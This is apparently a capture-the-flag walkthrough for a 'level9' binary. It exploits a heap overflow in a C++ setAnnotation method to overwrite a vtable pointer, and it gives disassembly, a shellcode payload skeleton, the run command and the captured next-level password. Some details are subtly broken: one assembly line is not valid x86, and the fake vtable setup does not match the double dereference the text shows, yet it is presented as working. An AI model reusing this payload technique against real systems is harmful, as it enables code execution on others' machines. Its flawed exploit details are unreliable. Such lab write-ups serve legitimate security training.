# Level 9 Walkthrough

## Binary Overview

The `level9` binary is a C++ program that contains a class `N`. The `N` class has:
- an `annotation` attribute of type `char[]`
- an `amount` attribute of type `int`
- a method `setAnnotation(char*)`
- an overloaded `+` operator that adds the `amount` of another instance of the `N` class to the `amount` of the current
instance
- an overloaded `-` operator that subtracts the `amount` of another instance of the `N` class from the `amount` of the
current instance

In the main function, two instances of the `N` class are created, and the `setAnnotation` method is called on one of
them to add the user's input as an annotation. Then, the program calls the `operator+` method of one of the instances to
add the `amount` of the other instance to it.

## The Vulnerability

The `setAnnotation` method is vulnerable to a buffer overflow attack because it uses `memcpy` to copy the user input
into `annotation` without checking the size of the input. Giving a long enough input will result in overwriting other
memory locations.

## Disassembly Highlights
`main` (pseudocode):
```asm
obj1 = new N(5);
obj2 = new N(6);
obj1->setAnnotation(argv[1]);
obj2->operator+(obj1);   // virtual call through obj2 vtable
```

`N::setAnnotation(char *s)`:
```asm
push ebp
mov  ebp, esp
sub  esp, 0x18
mov  eax, [ebp+s]
call strlen
mov  edx, [ebp+this]
add  edx, 4                 ; annotation buffer
mov  [esp+8], eax           ; length
mov  [esp+4], [ebp+s]
mov  [esp], edx
call memcpy                 ; no bounds check!
```
Constructor stores a vtable pointer at offset 0 and an integer at offset 0x6c, leaving a 100-byte annotation array in
between.

## Vulnerability
- Two `N` objects are allocated back to back on the heap (each 0x6c+4 bytes).
- The annotation buffer is 0x64 bytes (100). `memcpy` copies `strlen(argv[1])` bytes without checking that length.
- Overflowing past 0x64 bytes overwrites the second object’s fields, including its vtable pointer located at offset 0.
- Later the program does:
  ```asm
  mov eax, [esp+16]   ; obj2
  mov eax, [eax]      ; vtable pointer
  mov edx, [eax]      ; first virtual method
  call edx
  ```
  If we replace obj2’s vtable with an address we control, `call edx` jumps into our payload.

## Exploit Strategy
1. Build shellcode (e.g., execve `/bin/sh`) and prefix with a NOP sled.
2. Determine heap addresses via GDB: typical layout is `obj1 @ 0x804a008`, annotation buffer at `0x804a00c`.
3. Craft input: `[shellcode padding up to 0x6c bytes] + [fake vtable pointer = 0x804a00c]`.
4. Run `./level9 "$(python3 -c '...')"`; when the virtual call executes, it jumps to the pointer we supplied (start of
shellcode).

Payload skeleton:
```python
buf_addr = 0x804a00c     # update from GDB each run if needed
shellcode = b"\x90"*32 + b"...\xcc"
payload = shellcode.ljust(0x6c, b"A") + struct.pack("<I", buf_addr)
print(payload.decode('latin1'), end="")
```

## Flag
```bash
$ ./level9 "$(python3 exploit.py)"
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## Notes
- Because ASLR is partially disabled on the VM, the heap address remains stable (0x804a0xx). Otherwise leak the pointer
printed under GDB.
- No stack memory is touched; exploitation happens entirely on the heap via a C++ vtable overwrite.
